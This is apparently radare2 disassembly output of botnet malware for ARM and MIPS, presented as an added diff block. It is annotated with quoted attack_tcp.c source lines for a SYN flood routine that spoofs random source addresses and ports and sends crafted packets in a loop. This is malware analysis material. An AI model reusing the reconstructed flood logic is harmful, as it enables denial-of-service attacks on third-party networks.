+│ 0x000171a8      0020c3e5       strb r2, [r3]
+│ 0x000171ac      651600eb       bl dbg.rand_next                      ; attack_tcp.c:93        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
+│ 0x000171b0      0030a0e1       mov r3, r0
+│ 0x000171b4      0338a0e1       lsl r3, r3, 0x10
+│ 0x000171b8      2338a0e1       lsr r3, r3, 0x10
+│ 0x000171bc      0f3003e2       and r3, r3, 0xf
+│ 0x000171c0      0338a0e1       lsl r3, r3, 0x10
+│ 0x000171c4      2338a0e1       lsr r3, r3, 0x10
+│ 0x000171c8      573e83e2       add r3, r3, 0x570
+│ 0x000171cc      083083e2       add r3, r3, 8
+│ 0x000171d0      0338a0e1       lsl r3, r3, 0x10
+│ 0x000171d4      2338a0e1       lsr r3, r3, 0x10
+│ 0x000171d8      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x000171dc      845200eb       bl dbg.htons
+│ 0x000171e0      0030a0e1       mov r3, r0
+│ 0x000171e4      0320a0e1       mov r2, r3
+│ 0x000171e8      4c301be5       ldr r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x000171ec      b020c3e1       strh r2, [r3]
+│ 0x000171f0      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:94        opts += sizeof (uint16_t); ; 0x4c ; 76
+│ 0x000171f4      023083e2       add r3, r3, 2
+│ 0x000171f8      4c300be5       str r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x000171fc      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:97        *opts++ = PROTO_TCP_OPT_SACK; ; 0x4c ; 76
+│ 0x00017200      012083e2       add r2, r3, 1
+│ 0x00017204      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017208      0420a0e3       mov r2, 4
+│ 0x0001720c      0020c3e5       strb r2, [r3]
+│ 0x00017210      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:98        *opts++ = 2; ; 0x4c ; 76
+│ 0x00017214      012083e2       add r2, r3, 1
+│ 0x00017218      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x0001721c      0220a0e3       mov r2, 2
+│ 0x00017220      0020c3e5       strb r2, [r3]
+│ 0x00017224      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:101        *opts++ = PROTO_TCP_OPT_TSVAL; ; 0x4c ; 76
+│ 0x00017228      012083e2       add r2, r3, 1
+│ 0x0001722c      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017230      0820a0e3       mov r2, 8
+│ 0x00017234      0020c3e5       strb r2, [r3]
+│ 0x00017238      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:102        *opts++ = 10; ; 0x4c ; 76
+│ 0x0001723c      012083e2       add r2, r3, 1
+│ 0x00017240      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017244      0a20a0e3       mov r2, 0xa
+│ 0x00017248      0020c3e5       strb r2, [r3]
+│ 0x0001724c      3d1600eb       bl dbg.rand_next                      ; attack_tcp.c:103        *((uint32_t *)opts) = rand_next();
+│ 0x00017250      0020a0e1       mov r2, r0
+│ 0x00017254      4c301be5       ldr r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017258      002083e5       str r2, [r3]
+│ 0x0001725c      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:104        opts += sizeof (uint32_t); ; 0x4c ; 76
+│ 0x00017260      043083e2       add r3, r3, 4
+│ 0x00017264      4c300be5       str r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017268      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:105        *((uint32_t *)opts) = 0; ; 0x4c ; 76
+│ 0x0001726c      0020a0e3       mov r2, 0
+│ 0x00017270      002083e5       str r2, [r3]
+│ 0x00017274      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:106        opts += sizeof (uint32_t); ; 0x4c ; 76
+│ 0x00017278      043083e2       add r3, r3, 4
+│ 0x0001727c      4c300be5       str r3, [var_4ch]                     ; 0x4c ; 76
+│ 0x00017280      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:109        *opts++ = 1; ; 0x4c ; 76
+│ 0x00017284      012083e2       add r2, r3, 1
+│ 0x00017288      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x0001728c      0120a0e3       mov r2, 1
+│ 0x00017290      0020c3e5       strb r2, [r3]
+│ 0x00017294      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:112        *opts++ = PROTO_TCP_OPT_WSS; ; 0x4c ; 76
+│ 0x00017298      012083e2       add r2, r3, 1
+│ 0x0001729c      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x000172a0      0320a0e3       mov r2, 3
+│ 0x000172a4      0020c3e5       strb r2, [r3]
+│ 0x000172a8      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:113        *opts++ = 3; ; 0x4c ; 76
+│ 0x000172ac      012083e2       add r2, r3, 1
+│ 0x000172b0      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x000172b4      0320a0e3       mov r2, 3
+│ 0x000172b8      0020c3e5       strb r2, [r3]
+│ 0x000172bc      4c301be5       ldr r3, [var_4ch]                     ; attack_tcp.c:114        *opts++ = 6; // 2^6 = 64, window size scale = 64 ; 0x4c ; 76
+│ 0x000172c0      012083e2       add r2, r3, 1
+│ 0x000172c4      4c200be5       str r2, [var_4ch]                     ; 0x4c ; 76
+│ 0x000172c8      0620a0e3       mov r2, 6
+│ 0x000172cc      0020c3e5       strb r2, [r3]
+│ 0x000172d0      50301be5       ldr r3, [targs]                       ; attack_tcp.c:56    for (i = 0; i < targs_len; i++) ; 0x50 ; 80
+│ 0x000172d4      013083e2       add r3, r3, 1
+│ 0x000172d8      50300be5       str r3, [targs]                       ; 0x50 ; 80
+| // true: 0x000172dc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x16edc(x)
+│ 0x000172dc      55205be5       ldrb r2, [var_55h]                    ; attack_tcp.c:56    for (i = 0; i < targs_len; i++) ; 0x55 ; 85
+│ 0x000172e0      50301be5       ldr r3, [targs]                       ; 0x50 ; 80
+│ 0x000172e4      030052e1       cmp r2, r3
+│ 0x000172e8      fcfeffca       bgt 0x16ee0
+| // true: 0x00016ee0  false: 0x000172ec
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x175c4(x)
+│ 0x000172ec      0030a0e3       mov r3, 0                             ; attack_tcp.c:119        for (i = 0; i < targs_len; i++)
+│ 0x000172f0      50300be5       str r3, [targs]                       ; 0x50 ; 80
+│ 0x000172f4      ae0000ea       b 0x175b4
+| // true: 0x000175b4
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x175c0(x)
+│ 0x000172f8      50301be5       ldr r3, [targs]                       ; attack_tcp.c:121            char *pkt = pkts[i]; ; 0x50 ; 80
+│ 0x000172fc      0331a0e1       lsl r3, r3, 2
+│ 0x00017300      10201be5       ldr r2, [var_10h]                     ; 0x10 ; 16
+│ 0x00017304      033082e0       add r3, r2, r3
+│ 0x00017308      003093e5       ldr r3, [r3]
+│ 0x0001730c      38300be5       str r3, [var_38h]                     ; 0x38 ; 56
+│ 0x00017310      38301be5       ldr r3, [var_38h]                     ; attack_tcp.c:122            struct iphdr *iph = (struct iphdr *)pkt; ; 0x38 ; 56
+│ 0x00017314      3c300be5       str r3, [var_3ch]                     ; 0x3c ; 60
+│ 0x00017318      3c301be5       ldr r3, [var_3ch]                     ; attack_tcp.c:123            struct tcphdr *tcph = (struct tcphdr *)(iph + 1); ; 0x3c ; 60
+│ 0x0001731c      143083e2       add r3, r3, 0x14
+│ 0x00017320      40300be5       str r3, [opts]                        ; 0x40 ; 64
+│ 0x00017324      50301be5       ldr r3, [targs]                       ; attack_tcp.c:126            if (targs[i].netmask < 32) ; 0x50 ; 80
+│ 0x00017328      0320a0e1       mov r2, r3
+│ 0x0001732c      0230a0e1       mov r3, r2
+│ 0x00017330      8330a0e1       lsl r3, r3, 1
+│ 0x00017334      023083e0       add r3, r3, r2
+│ 0x00017338      8331a0e1       lsl r3, r3, 3
+│ 0x0001733c      0320a0e1       mov r2, r3
+│ 0x00017340      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x00017344      023083e0       add r3, r3, r2
+│ 0x00017348      1430d3e5       ldrb r3, [r3, 0x14]
+│ 0x0001734c      1f0053e3       cmp r3, 0x1f                          ; 31
+│ 0x00017350      1f00008a       bhi 0x173d4
+| // true: 0x000173d4  false: 0x00017354
+│ 0x00017354      50301be5       ldr r3, [targs]                       ; attack_tcp.c:127                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)); ; 0x50 ; 80
+│ 0x00017358      0320a0e1       mov r2, r3
+│ 0x0001735c      0230a0e1       mov r3, r2
+│ 0x00017360      8330a0e1       lsl r3, r3, 1
+│ 0x00017364      023083e0       add r3, r3, r2
+│ 0x00017368      8331a0e1       lsl r3, r3, 3
+│ 0x0001736c      0320a0e1       mov r2, r3
+│ 0x00017370      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x00017374      023083e0       add r3, r3, r2
+│ 0x00017378      103093e5       ldr r3, [r3, 0x10]
+│ 0x0001737c      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x00017380      165200eb       bl dbg.htonl
+│ 0x00017384      0040a0e1       mov r4, r0
+│ 0x00017388      ee1500eb       bl dbg.rand_next
+│ 0x0001738c      0020a0e1       mov r2, r0
+│ 0x00017390      50301be5       ldr r3, [targs]                       ; 0x50 ; 80
+│ 0x00017394      0310a0e1       mov r1, r3
+│ 0x00017398      0130a0e1       mov r3, r1
+│ 0x0001739c      8330a0e1       lsl r3, r3, 1
+│ 0x000173a0      013083e0       add r3, r3, r1
+│ 0x000173a4      8331a0e1       lsl r3, r3, 3
+│ 0x000173a8      0310a0e1       mov r1, r3
+│ 0x000173ac      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x000173b0      013083e0       add r3, r3, r1
+│ 0x000173b4      1430d3e5       ldrb r3, [r3, 0x14]
+│ 0x000173b8      3233a0e1       lsr r3, r2, r3
+│ 0x000173bc      033084e0       add r3, r4, r3
+│ 0x000173c0      0300a0e1       mov r0, r3                            ; int32_t arg1
+│ 0x000173c4      055200eb       bl dbg.htonl
+│ 0x000173c8      0020a0e1       mov r2, r0
+│ 0x000173cc      3c301be5       ldr r3, [var_3ch]                     ; 0x3c ; 60
+│ 0x000173d0      102083e5       str r2, [r3, 0x10]
+| // true: 0x000173d4
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x17350(x)
+│ 0x000173d4      30301be5       ldr r3, [iph]                         ; attack_tcp.c:129            if (source_ip == 0xffffffff) ; 0x30 ; 48
+│ 0x000173d8      010073e3       cmn r3, 1                             ; 1
+│ 0x000173dc      0300001a       bne 0x173f0
+| // true: 0x000173f0  false: 0x000173e0
+│ 0x000173e0      d81500eb       bl dbg.rand_next                      ; attack_tcp.c:130                iph->saddr = rand_next();
+│ 0x000173e4      0020a0e1       mov r2, r0
+│ 0x000173e8      3c301be5       ldr r3, [var_3ch]                     ; 0x3c ; 60
+│ 0x000173ec      0c2083e5       str r2, [r3, 0xc]
+| // true: 0x000173f0
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x173dc(x)
+│ 0x000173f0      b4315be1       ldrh r3, [seq]                        ; attack_tcp.c:131            if (ip_ident == 0xffff) ; 0x14 ; 20
+│ 0x000173f4      d8219fe5       ldr r2, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x000173f8      020053e1       cmp r3, r2
+│ 0x000173fc      0500001a       bne 0x17418
+| // true: 0x00017418  false: 0x00017400
+│ 0x00017400      d01500eb       bl dbg.rand_next                      ; attack_tcp.c:132                iph->id = rand_next() & 0xffff;
+│ 0x00017404      0030a0e1       mov r3, r0
+│ 0x00017408      0338a0e1       lsl r3, r3, 0x10
+│ 0x0001740c      2328a0e1       lsr r2, r3, 0x10
+│ 0x00017410      3c301be5       ldr r3, [var_3ch]                     ; 0x3c ; 60
+│ 0x00017414      b420c3e1       strh r2, [r3, 4]
+| // true: 0x00017418
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x173fc(x)
+│ 0x00017418      b8315be1       ldrh r3, [ack]                        ; attack_tcp.c:133            if (sport == 0xffff) ; 0x18 ; 24
+│ 0x0001741c      b0219fe5       ldr r2, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00017420      020053e1       cmp r3, r2
+│ 0x00017424      0500001a       bne 0x17440
+| // true: 0x00017440  false: 0x00017428
+│ 0x00017428      c61500eb       bl dbg.rand_next                      ; attack_tcp.c:134                tcph->source = rand_next() & 0xffff;
+│ 0x0001742c      0030a0e1       mov r3, r0
+│ 0x00017430      0338a0e1       lsl r3, r3, 0x10
+│ 0x00017434      2328a0e1       lsr r2, r3, 0x10
+│ 0x00017438      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x0001743c      b020c3e1       strh r2, [r3]
+| // true: 0x00017440
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x17424(x)
+│ 0x00017440      ba315be1       ldrh r3, [ack_fl]                     ; attack_tcp.c:135            if (dport == 0xffff) ; 0x1a ; 26
+│ 0x00017444      88219fe5       ldr r2, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00017448      020053e1       cmp r3, r2
+│ 0x0001744c      0500001a       bne 0x17468
+| // true: 0x00017468  false: 0x00017450
+│ 0x00017450      bc1500eb       bl dbg.rand_next                      ; attack_tcp.c:136                tcph->dest = rand_next() & 0xffff;
+│ 0x00017454      0030a0e1       mov r3, r0
+│ 0x00017458      0338a0e1       lsl r3, r3, 0x10
+│ 0x0001745c      2328a0e1       lsr r2, r3, 0x10
+│ 0x00017460      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x00017464      b220c3e1       strh r2, [r3, 2]
+| // true: 0x00017468
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x1744c(x)
+│ 0x00017468      20301be5       ldr r3, [var_20h]                     ; attack_tcp.c:137            if (seq == 0xffff) ; 0x20 ; 32
+│ 0x0001746c      60219fe5       ldr r2, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00017470      020053e1       cmp r3, r2
+│ 0x00017474      0300001a       bne 0x17488
+| // true: 0x00017488  false: 0x00017478
+│ 0x00017478      b21500eb       bl dbg.rand_next                      ; attack_tcp.c:138                tcph->seq = rand_next();
+│ 0x0001747c      0020a0e1       mov r2, r0
+│ 0x00017480      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x00017484      042083e5       str r2, [r3, 4]
+| // true: 0x00017488
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x17474(x)
+│ 0x00017488      24301be5       ldr r3, [source_ip]                   ; attack_tcp.c:139            if (ack == 0xffff) ; 0x24 ; 36
+│ 0x0001748c      40219fe5       ldr r2, [0x000175d4]                  ; [0x175d4:4]=0xffff
+│ 0x00017490      020053e1       cmp r3, r2
+│ 0x00017494      0300001a       bne 0x174a8
+| // true: 0x000174a8  false: 0x00017498
+│ 0x00017498      aa1500eb       bl dbg.rand_next                      ; attack_tcp.c:140                tcph->ack_seq = rand_next();
+│ 0x0001749c      0020a0e1       mov r2, r0
+│ 0x000174a0      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x000174a4      082083e5       str r2, [r3, 8]
+| // true: 0x000174a8
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x17494(x)
+│ 0x000174a8      25305be5       ldrb r3, [var_25h]                    ; attack_tcp.c:141            if (urg_fl) ; 0x25 ; 37
+│ 0x000174ac      000053e3       cmp r3, 0
+│ 0x000174b0      0500000a       beq 0x174cc
+| // true: 0x000174cc  false: 0x000174b4
+│ 0x000174b4      a31500eb       bl dbg.rand_next                      ; attack_tcp.c:142                tcph->urg_ptr = rand_next() & 0xffff;
+│ 0x000174b8      0030a0e1       mov r3, r0
+│ 0x000174bc      0338a0e1       lsl r3, r3, 0x10
+│ 0x000174c0      2328a0e1       lsr r2, r3, 0x10
+│ 0x000174c4      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x000174c8      b221c3e1       strh r2, [r3, 0x12]
+| // true: 0x000174cc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x174b0(x)
+│ 0x000174cc      3c301be5       ldr r3, [var_3ch]                     ; attack_tcp.c:144            iph->check = 0; ; 0x3c ; 60
+│ 0x000174d0      0020a0e3       mov r2, 0
+│ 0x000174d4      ba20c3e1       strh r2, [r3, 0xa]
+│ 0x000174d8      1410a0e3       mov r1, 0x14                          ; attack_tcp.c:145            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr)); ; int32_t arg2
+│ 0x000174dc      3c001be5       ldr r0, [var_3ch]                     ; 0x3c ; 60 ; int32_t arg1
+│ 0x000174e0      8b0b00eb       bl dbg.checksum_generic
+│ 0x000174e4      0030a0e1       mov r3, r0
+│ 0x000174e8      0320a0e1       mov r2, r3
+│ 0x000174ec      3c301be5       ldr r3, [var_3ch]                     ; 0x3c ; 60
+│ 0x000174f0      ba20c3e1       strh r2, [r3, 0xa]
+│ 0x000174f4      40301be5       ldr r3, [opts]                        ; attack_tcp.c:147            tcph->check = 0; ; 0x40 ; 64
+│ 0x000174f8      0020a0e3       mov r2, 0
+│ 0x000174fc      b021c3e1       strh r2, [r3, 0x10]
+│ 0x00017500      2800a0e3       mov r0, 0x28                          ; attack_tcp.c:148            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20); ; '(' ; int32_t arg1
+│ 0x00017504      ba5100eb       bl dbg.htons
+│ 0x00017508      0030a0e1       mov r3, r0
+│ 0x0001750c      0320a0e1       mov r2, r3
+│ 0x00017510      2830a0e3       mov r3, 0x28                          ; '('
+│ 0x00017514      40101be5       ldr r1, [opts]                        ; 0x40 ; 64 ; int32_t arg2
+│ 0x00017518      3c001be5       ldr r0, [var_3ch]                     ; 0x3c ; 60 ; int32_t arg1
+│ 0x0001751c      a40b00eb       bl dbg.checksum_tcpudp
+│ 0x00017520      0030a0e1       mov r3, r0
+│ 0x00017524      0320a0e1       mov r2, r3
+│ 0x00017528      40301be5       ldr r3, [opts]                        ; 0x40 ; 64
+│ 0x0001752c      b021c3e1       strh r2, [r3, 0x10]
+│ 0x00017530      50301be5       ldr r3, [targs]                       ; attack_tcp.c:150            targs[i].sock_addr.sin_port = tcph->dest; ; 0x50 ; 80
+│ 0x00017534      0320a0e1       mov r2, r3
+│ 0x00017538      0230a0e1       mov r3, r2
+│ 0x0001753c      8330a0e1       lsl r3, r3, 1
+│ 0x00017540      023083e0       add r3, r3, r2
+│ 0x00017544      8331a0e1       lsl r3, r3, 3
+│ 0x00017548      0320a0e1       mov r2, r3
+│ 0x0001754c      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x00017550      023083e0       add r3, r3, r2
+│ 0x00017554      40201be5       ldr r2, [opts]                        ; 0x40 ; 64
+│ 0x00017558      b220d2e1       ldrh r2, [r2, 2]
+│ 0x0001755c      b220c3e1       strh r2, [r3, 2]
+│ 0x00017560      50301be5       ldr r3, [targs]                       ; attack_tcp.c:151            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)); ; 0x50 ; 80
+│ 0x00017564      0320a0e1       mov r2, r3
+│ 0x00017568      0230a0e1       mov r3, r2
+│ 0x0001756c      8330a0e1       lsl r3, r3, 1
+│ 0x00017570      023083e0       add r3, r3, r2
+│ 0x00017574      8331a0e1       lsl r3, r3, 3
+│ 0x00017578      0320a0e1       mov r2, r3
+│ 0x0001757c      5c301be5       ldr r3, [var_5ch]                     ; 0x5c ; 92
+│ 0x00017580      023083e0       add r3, r3, r2
+│ 0x00017584      0320a0e1       mov r2, r3
+│ 0x00017588      1030a0e3       mov r3, 0x10
+│ 0x0001758c      04308de5       str r3, [var_4h]
+│ 0x00017590      00208de5       str r2, [sp]
+│ 0x00017594      0139a0e3       mov r3, 0x4000
+│ 0x00017598      3c20a0e3       mov r2, 0x3c                          ; '<'
+│ 0x0001759c      38101be5       ldr r1, [var_38h]                     ; 0x38 ; 56 ; int32_t arg2
+│ 0x000175a0      34001be5       ldr r0, [tcph]                        ; elf_phdr
+│                                                                      ; 0x34 ; int32_t arg1
+│ 0x000175a4      385100eb       bl dbg.__libc_sendto
+│ 0x000175a8      50301be5       ldr r3, [targs]                       ; attack_tcp.c:119        for (i = 0; i < targs_len; i++) ; 0x50 ; 80
+│ 0x000175ac      013083e2       add r3, r3, 1
+│ 0x000175b0      50300be5       str r3, [targs]                       ; 0x50 ; 80
+| // true: 0x000175b4
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x172f4(x)
+│ 0x000175b4      55205be5       ldrb r2, [var_55h]                    ; attack_tcp.c:119        for (i = 0; i < targs_len; i++) ; 0x55 ; 85
+│ 0x000175b8      50301be5       ldr r3, [targs]                       ; 0x50 ; 80
+│ 0x000175bc      030052e1       cmp r2, r3
+│ 0x000175c0      4cffffca       bgt 0x172f8
+| // true: 0x000172f8  false: 0x000175c4
+│ 0x000175c4      48ffffea       b 0x172ec                             ; attack_tcp.c:119        for (i = 0; i < targs_len; i++)
+| // true: 0x000172ec
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x16e94(x)
+│ 0x000175c8      0000a0e1       mov r0, r0                            ; attack_tcp.c:43        return;
+| // true: 0x000175cc
+│ ; CODE XREF from dbg.attack_tcp_syn @ 0x16ed0(x)
+│ 0x000175cc      08d04be2       sub sp, ip_ident                      ; attack_tcp.c:159}
+└ 0x000175d0      1088bde8       pop {r4, fp, pc}
+
+
+
+=== MIPS Analysis ===
+Function address: 0x4083e0
+
+ESIL:
+0x00421aec      03e00008       jr ra                                   ; syscall-template.S:122 ret
+0x00421af0      00000000       nop
+0x00421af0      00000000       nop
+0x00421af4      00000000       nop
+0x00421af8      00000000       nop                                     ; syscall-template.S:122 ret
+0x00421afc      00000000       nop
+0x00421b00      00000000       nop
+0x00421b04      00000000       nop
+  ; CALL XREF from dbg.attack_app_http @ 0x402680(x)
+  ; CALL XREF from dbg.attack_app_cfnull @ 0x405fa0(x)
+  ; CALL XREF from dbg.main @ 0x40e84c(x)
+8: sym..pic.getsockopt ();
+0x00421b08      3c190042       lui t9, 0x42
+0x00421b0c      27391b10       addiu t9, t9, 0x1b10                    ; 0x421b10 ; "<\x1c" ; sym.__getsockopt64
+  ;-- __getsockopt64:
+  ;-- getsockopt:
+  ;-- __getsockopt:
+  ; DATA XREF from sym..pic.getsockopt @ 0x421b0c(r)
+136: dbg.__getsockopt (int32_t arg_38h);
+`- args(sp[0x10..0x10]) vars(4:sp[0x4..0x18])
+; int __getsockopt(int fd,int level,int optname,void * optval,socklen_
+; t * len);
+0x00421b10      3c1c000a       lui gp, 0xa                             ; getsockopt.c:93{
+0x00421b14      279c9350       addiu gp, gp, -0x6cb0
+0x00421b18      0399e021       addu gp, gp, t9
+0x00421b1c      27bdffd8       addiu sp, sp, -0x28                     ; getsockopt.c:94  int r = getsockopt_syscall (fd, level, optname, optval, len);
+0x00421b20      2402104d       addiu v0, zero, 0x104d                  ; getsockopt.c:25getsockopt_syscall (int fd, int level, int optname, void *optval,
+0x00421b24      afa20014       sw v0, (var_14h)
+0x00421b28      8fa20038       lw v0, (arg_38h)
+0x00421b2c      8f9982b4       lw t9, -dbg.__mips_syscall5(gp)         ; [0x421060:4]=0x8fa20014
+0x00421b30      afbc0018       sw gp, (var_18h)                        ; getsockopt.c:93{
+0x00421b34      afbf0024       sw ra, (var_24h)
+0x00421b38      afa20010       sw v0, (var_10h)                        ; getsockopt.c:29  return INLINE_SYSCALL (getsockopt, 5, fd, level, optname, optval, len);
+0x00421b3c      0411fd48       bal dbg.__mips_syscall5                 ; getsockopt.c:93{
+0x00421b40      00000000       nop
+  ;-- __mips_syscall5:
+  ; XREFS: DATA 0x0041f578  CALL 0x0041f5bc  DATA 0x004210a4  
+  ; XREFS: CALL 0x004210b0  DATA 0x004211e4  CALL 0x00421200  
+  ; XREFS: DATA 0x00421b2c  CALL 0x00421b3c  DATA 0x004221cc  
+  ; XREFS: CALL 0x004221dc  DATA 0x00439bf0  CALL 0x00439c10  
+  ; XREFS: DATA 0x00439f9c  CALL 0x00439fb4  DATA 0x004681a0  
+  ; XREFS: CALL 0x004681c0  0x0049bf18  
+16: dbg.__mips_syscall5 (int32_t arg_14h);
+`- args(sp[0x14..0x14])
+0x00421060      8fa20014       lw v0, (arg_14h)                        ; mips-syscall5.S:30 lw v0, 20(sp) ; void __mips_syscall5();
+0x00421064      0000000c       syscall                                 ; mips-syscall5.S:31 syscall
+0x00421068      03e00008       jr ra                                   ; mips-syscall5.S:32 move v1, a3
+0x0042106c      00e01825       move v1, a3
+0x00421b44      8fbc0018       lw gp, (var_18h)                        ; getsockopt.c:29  return INLINE_SYSCALL (getsockopt, 5, fd, level, optname, optval, len);
+0x00421b48      10600003       beqz v1, 0x421b58
+0x00421b4c      2c43f001       sltiu v1, v0, -0xfff
+0x00421b4c      2c43f001       sltiu v1, v0, -0xfff
+0x00421b50      00021023       negu v0, v0
+0x00421b54      2c43f001       sltiu v1, v0, -0xfff                    ; getsockopt.c:29  return INLINE_SYSCALL (getsockopt, 5, fd, level, optname, optval, len);
+; CODE XREF from dbg.__getsockopt @ 0x421b48(x)
+0x00421b58      10600005       beqz v1, 0x421b70
+0x00421b5c      00000000       nop
+0x00421b5c      00000000       nop
+0x00421b60      8fbf0024       lw ra, (var_24h)                        ; getsockopt.c:102}
+0x00421b64      00000000       nop
+0x00421b68      03e00008       jr ra
+0x00421b6c      27bd0028       addiu sp, sp, 0x28
+0x00421b6c      27bd0028       addiu sp, sp, 0x28
+; CODE XREF from dbg.__getsockopt @ 0x421b58(x)
+0x00421b70      7c03e83b       rdhwr v1, 29                            ; getsockopt.c:29  return INLINE_SYSCALL (getsockopt, 5, fd, level, optname, optval, len);
+0x00421b74      00602025       move a0, v1
+0x00421b78      8f838b1c       lw v1, -0x74e4(gp)                      ; [0x4b397c:4]=0xffff9018
+0x00421b7c      8fbf0024       lw ra, (var_24h)                        ; getsockopt.c:102}
+0x00421b80      00021023       negu v0, v0                             ; getsockopt.c:29  return INLINE_SYSCALL (getsockopt, 5, fd, level, optname, optval, len);
+0x00421b84      00641821       addu v1, v1, a0
+0x00421b88      ac620000       sw v0, (v1)
+0x00421b8c      2402ffff       addiu v0, zero, -1
+0x00421b90      03e00008       jr ra
+0x00421b94      27bd0028       addiu sp, sp, 0x28
+0x00421b94      27bd0028       addiu sp, sp, 0x28
+0x00421b98      00000000       nop                                     ; getsockopt.c:102}
+0x00421b9c      00000000       nop
+;-- aav.0x00421ba0:
+; CODE XREF from dbg.listen @ 0x421bc4(x)
+; NULL XREF from section..eh_frame @ +0x658(x)
+0x00421ba0      8f99814c       lw t9, -dbg.__syscall_error(gp)         ; syscall-template.S:120T_PSEUDO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS) ; [0x4b2fac:4]=0x425530 dbg.__syscall_error
+0x00421ba4      00000000       nop
+0x00421ba8      03200008       jr t9
+0x00421bac      00000000       nop
+  ;-- __syscall_error:
+  ; XREFS: ICOD 0x00412790  ICOD 0x0041ee90  ICOD 0x0041efc0  
+  ; XREFS: ICOD 0x00420af0  ICOD 0x00420be0  ICOD 0x00420c20  
+  ; XREFS: ICOD 0x00421120  ICOD 0x00421240  ICOD 0x00421940  
+  ; XREFS: ICOD 0x00421ac0  ICOD 0x00421ba0  ICOD 0x00422240  
+  ; XREFS: ICOD 0x00439e40  ICOD 0x00439e80  ICOD 0x00439ec0  
+  ; XREFS: ICOD 0x00439f00  ICOD 0x00439f40  0x0049c178  
+92: dbg.__syscall_error ();
+afv: vars(3:sp[0x4..0xc])
+0x00425530      03e00825       move at, ra                             ; sysdep.S:35 SETUP_GPX (AT) ; void __syscall_error();
+0x00425534      04110001       bal 0x42553c
+0x00425538      00000000       nop
+; CALL XREF from dbg.__syscall_error @ 0x425534(x)
+0x0042553c      3c1c0009       lui gp, 9
+0x00425540      279c5924       addiu gp, gp, 0x5924
+0x00425544      039fe021       addu gp, gp, ra
+
+
+Disassembly:
+  ;-- attack_tcp_syn:
+  ; DATA XREF from dbg.attack_init @ 0x407794(r)
+┌ 2912: dbg.attack_tcp_syn (int32_t arg2, int32_t arg_20h, int32_t arg_24h, int32_t arg_26h, int32_t arg_28h, signed int arg_29h, int32_t arg_2ah, int32_t arg_2ch, int32_t arg_30h, int32_t arg_34h, signed int arg_38h, int32_t arg_39h, int32_t arg_3ah, int32_t arg_3bh, int32_t arg_3ch, int32_t arg_3dh, int32_t arg_40h, int32_t arg_44h, int32_t arg_48h, int32_t arg_4ch, int32_t arg_50h, int32_t arg_54h, int32_t arg_58h, int32_t arg_5ch, int32_t arg_60h, int32_t arg_78h, int32_t arg_7ch, int32_t arg_80h, int32_t arg_84h, int32_t arg_6ch, int32_t arg_70h, int32_t arg_74h);
+│ `- args(a1, sp[0x20..0x84]) vars(54:sp[0x4..0x68])
+; void attack_tcp_syn(uint8_t targs_len,attack_target * targs,uint8_t
+; opts_len,attack_option * opts);
+│ 0x004083e0      27bdff88       addiu sp, sp, -0x78                   ; attack_tcp.c:19{
+│ 0x004083e4      afbf0074       sw ra, (var_74h)
+│ 0x004083e8      afbe0070       sw fp, (var_70h)
+│ 0x004083ec      afb0006c       sw s0, (var_6ch)
